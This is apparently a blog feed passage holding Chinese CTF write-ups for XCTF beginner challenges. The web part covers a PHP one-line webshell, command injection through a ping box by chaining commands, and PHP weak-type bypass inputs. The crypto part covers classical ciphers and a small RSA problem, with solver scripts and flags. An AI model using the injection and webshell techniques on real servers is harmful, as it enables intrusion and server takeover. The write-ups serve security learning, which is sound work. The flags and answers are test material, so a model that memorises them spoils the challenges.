题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\10.jpg" alt></p><blockquote><p> webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将 其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服 务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，”web”的含义是显然需要服务器开放web服务，”shell”的含义是取得对服务器某 种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操 作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 首先新建一个index.php文件，把PHP代码输入到里面，电脑可能会自动识别它为病毒，并 删除，可以恢复后使用  </p></blockquote><p>正如题目提示：php一句话——即<strong>php一句话木马</strong>： <a href="https://my.oschina.net/programs/blog/1649544" target="_blank" rel="noopener">https://my.oschina.net/programs/blog/1649544</a> </p><p>了解之后，想用burpsuite的post请求发送也没能获取数据，于是看了wp，用中国蚁剑连了webshell，然后直接发现目录底下就有flag.txt。</p><p><del>做完之后，查看官方wp，我也没弄懂他wp怎么用burpsuite去post数据来获取webshell（我回显不了数据</del></p><p>update：post没有回显是因为我少了分号，还有就是hackbar的post没有发出去。后面成功用burpsuite发送post请求，成功执行命令。</p><h2 id="0x0b-command-execution"><a href="#0x0b-command-execution" class="headerlink" title="0x0b command execution"></a>0x0b command execution</h2><blockquote><p> 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 </p></blockquote><p>进入页面有个输入框，尝试输入127.0.0.1发现能够ping通并显示命令</p><p>于是联想到<strong>命令拼接</strong>利用&amp;或|或；让我们的命令和ping一起执行，发现flag在<code>/home/flag.txt</code>里</p><p>用find命令的时候，不知道为什么在他的shell里搜索的时候要带引号，即<code>find / -name &quot;flag*&quot;</code>才能成功执行命令回显，去掉引号即失败了。</p><h2 id="0x0c-simple-php"><a href="#0x0c-simple-php" class="headerlink" title="0x0c simple php"></a>0x0c simple php</h2><blockquote><p> 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进入页面，见到如上php代码，应该是<strong>代码审计</strong>。</p><p>即让a满足<code>$a==0 and $a</code>且b满足<code>is_numeric($b)==flase&amp;$b&gt;1234</code>得到两个flag</p><blockquote><p> php中的弱类型比较会使’abc’ == 0为真，所以输入a=abc时，可得到flag1。（abc可换成任意字符）。 </p></blockquote><blockquote><p> is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真，所以当输入a=abc&amp;b=1235a，可得到flag2。</p></blockquote><blockquote><p> 发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的 形式 数字和字符混合的字符串转换为整数后只保留数字 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-web-wp\12.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-crypto-wp</title>
      <link href="/2019/11/10/XCTF-adworld-crypto-wp/"/>
      <url>/2019/11/10/XCTF-adworld-crypto-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto-amp-WriteUp"><a href="#Crypto-amp-WriteUp" class="headerlink" title="Crypto&amp;WriteUp"></a><center>Crypto&amp;WriteUp</center></h1><p>crypto永远充满了google和常识（还有工具</p><h1 id="攻防世界-amp-Crypto新手练习区"><a href="#攻防世界-amp-Crypto新手练习区" class="headerlink" title="攻防世界&amp;Crypto新手练习区"></a><center>攻防世界&amp;Crypto新手练习区</center></h1><h2 id="0x01-幂数加密"><a href="#0x01-幂数加密" class="headerlink" title="0x01 幂数加密"></a>0x01 幂数加密</h2><blockquote><p>  题目描述：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母} </p></blockquote><p>下载附件打开查看是txt，里面放一段数字</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8842101220480224404014224202480122</span></span><br></pre></td></tr></table></figure><p>由ctf-wiki的常识可知，这是01248加密，即以0为分割，将其中的数加起来对应字母表的排位。</p><p>解得flag</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01248</span>：</span><br><span class="line"><span class="number">23</span> <span class="number">5</span> <span class="number">12</span> <span class="number">12</span> <span class="number">4</span> <span class="number">15</span> <span class="number">14</span> <span class="number">5</span></span><br><span class="line">w  e l  l  d o  n  e</span><br></pre></td></tr></table></figure><h2 id="0x02-base64"><a href="#0x02-base64" class="headerlink" title="0x02 base64"></a>0x02 base64</h2><blockquote><p>题目描述：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。 </p></blockquote><p>打开附件是一段英文，有题目得知是base64编码，解码得flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</span></span><br><span class="line"><span class="xml">cyberpeace</span><span class="template-variable">&#123;Welcome_to_new_World!&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="0x03-Caesar"><a href="#0x03-Caesar" class="headerlink" title="0x03 Caesar"></a>0x03 Caesar</h2><blockquote><p>题目描述：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p></blockquote><p>由题目得知是凯撒密码，随便百度一个工具进行暴力破解得知，移位12位</p><p>快捷：算出o和c得插值，但是我觉得更慢</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmo<span class="string">q&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span></span><br><span class="line">cyberpeace<span class="string">&#123;you_have_learned_caesar_encryption&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-Morse"><a href="#0x04-Morse" class="headerlink" title="0x04 Morse"></a>0x04 Morse</h2><blockquote><p> 题目描述：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写) </p></blockquote><p>下载附件，打开文档是一串01串</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span> <span class="number">111</span> <span class="number">010</span> <span class="number">000</span> <span class="number">0</span> <span class="number">1010</span> <span class="number">111</span> <span class="number">100</span> <span class="number">0</span> <span class="number">00</span> <span class="number">000</span> <span class="number">000</span> <span class="number">111</span> <span class="number">00</span> <span class="number">10</span> <span class="number">1</span> <span class="number">0</span> <span class="number">010</span> <span class="number">0</span> <span class="number">000</span> <span class="number">1</span> <span class="number">00</span> <span class="number">10</span> <span class="number">110</span></span><br></pre></td></tr></table></figure><p>假如按<code>1:=.&amp;0:=-</code>翻译则第一个字母可翻译，但是后面有一个字符无法翻译</p><p>因此，01调换顺序<code>1:=-&amp;0:=.</code></p><p>利用python的str.replace的到<code>.-</code>的morsecode，找个在线工具直接翻译得到结果，需要自己加上cyberpeace{}格式：<code>cyberpeace{morsecodeissointeresting}</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">morsecodeissointeresting</span></span><br></pre></td></tr></table></figure><p>可惜我后来没注意到需要全部小写，浪费了时间。</p><h2 id="0x05-Railfence"><a href="#0x05-Railfence" class="headerlink" title="0x05 Railfence"></a>0x05 Railfence</h2><blockquote><p> 题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。 </p></blockquote><p>打开附件是一个文档如下，如题目明显的是栅栏加密。找了个在线工具破解。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_or<span class="built_in">a_g</span></span><br></pre></td></tr></table></figure><p>结果常规栅栏加密没跑出来，在看到题目有一个数字5盲猜这可能是栅栏加密的key，但是常规的是跑不出来flag的，后面看百科知道有个是www型栅栏加密</p><p><strong>PS:WWW型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。</strong></p><p>由题目可知key可能是5，一尝试果然正确，得到flag：<code>cyberpeace{railfence_cipher_gogogo}</code></p><p>附一个www型栅栏密码的网站： <a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a> </p><p>附赠一个栅栏密码的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常见的栅栏解密</span></span><br><span class="line"></span><br><span class="line">e = input(<span class="string">'清输入要解密的字符串\n'</span>)</span><br><span class="line">elen = len(e)  <span class="comment"># 计算字符串长度</span></span><br><span class="line">field = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, elen):  <span class="comment"># 做一个循环，从2开始到数字elen（字符串长度）</span></span><br><span class="line">    <span class="keyword">if</span> elen % i == <span class="number">0</span>:  <span class="comment"># 计算那些数字能整除字符串长度</span></span><br><span class="line">        field.append(i)  <span class="comment"># 将能整出的数字加入到field里面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">    b = elen // f  <span class="comment"># 用字符串实际长度除以上面计算出能整出的数字f</span></span><br><span class="line">    result = &#123;x: <span class="string">''</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):  <span class="comment"># 字符串有多少位，就循环多少次</span></span><br><span class="line">        a = i % b</span><br><span class="line">        result.update(&#123;a: result[a] + e[i]&#125;)  <span class="comment"># 字符串截断，并更新数据</span></span><br><span class="line">    d = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</span><br><span class="line">        d += result[i]</span><br><span class="line">    print(<span class="string">'分为'</span>+str(f)+<span class="string">'栏时，解密结果为：'</span>+d+<span class="string">'\n'</span>)  <span class="comment"># 输出结果，并开始下一个循环</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#W型加密</span></span><br><span class="line"></span><br><span class="line">string=input(<span class="string">"输入要加密的字符串\n"</span>)</span><br><span class="line">length = len(string)</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜想不会是一栏,和n栏（滑稽）因为这个就是原来字符串（狗头）</span></span><br><span class="line"><span class="comment">#那么，就暴力遍历一波其中的那些⑧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,length):</span><br><span class="line">    result=&#123;x:<span class="string">""</span><span class="keyword">for</span> x <span class="keyword">in</span> range(i)&#125;  </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(length) :</span><br><span class="line">        width=i*<span class="number">2</span><span class="number">-2</span></span><br><span class="line">        num=a%width</span><br><span class="line">        <span class="keyword">if</span>(num&lt;i):</span><br><span class="line">            result.update(&#123;num:result[num]+string[a]&#125;)           </span><br><span class="line">        <span class="keyword">else</span>:         </span><br><span class="line">            ll=<span class="number">2</span>*i<span class="number">-2</span>-num</span><br><span class="line">            result.update(&#123;ll:result[ll]+string[a]&#125;)               </span><br><span class="line">    d=<span class="string">''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(i):</span><br><span class="line">        d=d+result[k]</span><br><span class="line">    print(<span class="string">"分为"</span>+str(i)+<span class="string">"栏,结果是："</span>+d)</span><br></pre></td></tr></table></figure><h2 id="0x06-转轮机加密"><a href="#0x06-转轮机加密" class="headerlink" title="0x06 转轮机加密"></a>0x06 转轮机加密</h2><blockquote><p> 题目描述：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊 </p></blockquote><p>看题目可知是转轮机算法</p><p>附件内容如下：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>:   &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"><span class="attribute">2</span>:   &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"><span class="attribute">3</span>:   &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"><span class="attribute">4</span>:   &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"><span class="attribute">5</span>:   &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"><span class="attribute">6</span>:   &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"><span class="attribute">7</span>:   &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"><span class="attribute">8</span>:   &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"><span class="attribute">9</span>:   &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"><span class="attribute">10</span>:  &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"><span class="attribute">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span></span><br><span class="line"><span class="attribute">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span></span><br><span class="line"><span class="attribute">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">密钥为： 2,3,7,5,13,12,9,1,8,10,4,11,6</span></span><br><span class="line"><span class="attribute">密文为：NFQKSEVOQOFNP</span></span><br></pre></td></tr></table></figure><p>//TODO：还需要搞清楚转轮机算法的原理，有点混乱现在</p><p>官方wp给出以下python自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">sss=<span class="string">'''1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">m=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">content=re.findall(<span class="string">r'&lt; (.*?) &lt;'</span>,sss,re.S)</span><br><span class="line">iv=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span>]</span><br><span class="line">vvv=[]</span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">   index=content[iv[i]<span class="number">-1</span>].index(m[i])</span><br><span class="line">   vvv.append(index)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">   flag=<span class="string">""</span></span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">       flag+=content[iv[j]<span class="number">-1</span>][(vvv[j]+i)%<span class="number">26</span>]</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><h2 id="0x07-easy-RSA"><a href="#0x07-easy-RSA" class="headerlink" title="0x07 easy RSA"></a>0x07 easy RSA</h2><p>打开附件查看。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=<span class="number">473398607161</span>，q=<span class="number">4511491</span>，e=<span class="number">17</span></span><br><span class="line">求解出d</span><br><span class="line">fi=(p<span class="number">-1</span>)(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e*d=<span class="number">1</span> mod fi</span><br><span class="line">d=e^(fi(fi)<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>感谢舍友的cpp文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="function">ll  <span class="title">gcd</span><span class="params">(ll a,ll b,ll&amp;aa,ll&amp;bb)</span></span>&#123;</span><br><span class="line">4ll ab=<span class="number">0</span>,ba=<span class="number">0</span>;aa=<span class="number">1</span>;bb=<span class="number">1</span>;</span><br><span class="line">4<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">44<span class="keyword">if</span>(a==<span class="number">0</span>)&#123;aa=ba;<span class="keyword">return</span> b;&#125;</span><br><span class="line">44ba-=(b/a)*aa;bb-=(b/a)*ab;b%=a;</span><br><span class="line">44<span class="keyword">if</span>(b==<span class="number">0</span>)&#123;bb=ab;<span class="keyword">return</span> a;&#125;</span><br><span class="line">44aa-=(a/b)*ba;ab-=(a/b)*bb;a%=b;</span><br><span class="line">4&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">mod_inverse</span><span class="params">(ll a,ll mod)</span></span>&#123;</span><br><span class="line">4ll res,temp;</span><br><span class="line">4ll d=gcd(a,mod,res,temp);</span><br><span class="line">4<span class="keyword">if</span>(d==<span class="number">1</span>)<span class="keyword">return</span> res;</span><br><span class="line">4<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">4ll p,q,e,d;</span><br><span class="line">4p = <span class="number">473398607161</span>;</span><br><span class="line">4q = <span class="number">4511491</span>;</span><br><span class="line">4e = <span class="number">17</span>;</span><br><span class="line">4<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;mod_inverse(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据舍友给的rsa的cpp文件改出的python脚本，不会爆longlong哦（虽然原题也不会爆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EX_GCD</span><span class="params">(a,b,arr)</span>:</span> <span class="comment">#扩展欧几里得</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    g = EX_GCD(b, a % b, arr)</span><br><span class="line">    t = arr[<span class="number">0</span>]</span><br><span class="line">    arr[<span class="number">0</span>] = arr[<span class="number">1</span>]</span><br><span class="line">    arr[<span class="number">1</span>] = t - int(a / b) * arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line">4</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModReverse</span><span class="params">(a,n)</span>:</span> <span class="comment">#ax=1(mod n) 求a模n的乘法逆x</span></span><br><span class="line">    arr = [<span class="number">0</span>,<span class="number">1</span>,]</span><br><span class="line">    gcd = EX_GCD(a,n,arr)</span><br><span class="line">    <span class="keyword">if</span> gcd == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (arr[<span class="number">0</span>] % n + n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">a,b = eval(input())</span></span><br><span class="line"><span class="string">print(ModReverse(a,b))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">4<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">44l = input(<span class="string">"p,q,e:"</span>)</span><br><span class="line">44p,q,e = map(<span class="keyword">lambda</span> x:int(x),l.split(<span class="string">","</span>))</span><br><span class="line">44fn = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">44<span class="comment">#print(l)</span></span><br><span class="line">44d = ModReverse(e,fn)</span><br><span class="line">44print(<span class="string">"d=%d"</span>%d)</span><br></pre></td></tr></table></figure><p>PS：看官方wp给出了一个GitHub项目地址：一款可以解rsa的工具 <a href="https://github.com/3summer/CTF-RSA-tool" target="_blank" rel="noopener">https://github.com/3summer/CTF-RSA-tool</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py --verbose --private -N <span class="number">2135733555619387051</span> -e <span class="number">17</span> -p <span class="number">473398607161</span> -q <span class="number">4511491</span></span><br></pre></td></tr></table></figure><h2 id="0x08-Normal-RSA"><a href="#0x08-Normal-RSA" class="headerlink" title="0x08 Normal_RSA"></a>0x08 Normal_RSA</h2><blockquote><p> 题目描述：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光 